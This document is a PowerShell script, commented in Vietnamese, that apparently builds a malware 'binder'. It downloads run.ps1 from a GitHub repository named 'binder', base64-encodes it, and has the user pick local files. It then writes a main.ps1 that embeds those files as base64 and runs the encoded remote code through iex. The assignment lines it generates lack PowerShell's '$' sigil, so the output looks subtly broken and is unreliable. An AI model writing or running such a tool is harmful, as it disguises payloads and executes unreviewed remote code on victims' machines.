# URL chứa nội dung cần tải
$url = "https://raw.githubusercontent.com/s1uiasdad/binder/main/file/run.ps1"

# Tạo thư mục mới nếu chưa tồn tại
$directoryPath = ".\fileinhere"
if (-Not (Test-Path -Path $directoryPath)) {
    New-Item -Path $directoryPath -ItemType Directory
}

# Tải nội dung từ URL và mã hóa base64
$content = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content
$codebinder = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))

# Hiển thị danh sách các file trong thư mục đã tạo để chọn
$files = Get-ChildItem -Path $directoryPath -File | Out-GridView -PassThru -Title "Chọn file để thêm vào main.ps1"

# Xóa file main.ps1 nếu tồn tại
if (Test-Path "main.ps1") {
    Remove-Item "main.ps1"
}

# Tạo lại file main.ps1 và thêm nội dung cần thiết
foreach ($file in $files) {
    # Đọc nội dung file và mã hóa base64
    $fileContent = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($file.FullName))
    $fileName = $file.Name

    # Thêm nội dung vào main.ps1
    Add-Content -Path "main.ps1" -Value "Filecontent = '$fileContent'"
    Add-Content -Path "main.ps1" -Value "name = '$fileName'"
    Add-Content -Path "main.ps1" -Value "iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('$codebinder')))"
}

# Thông báo hoàn thành
Write-Output "Đã hoàn tất tạo file main.ps1"
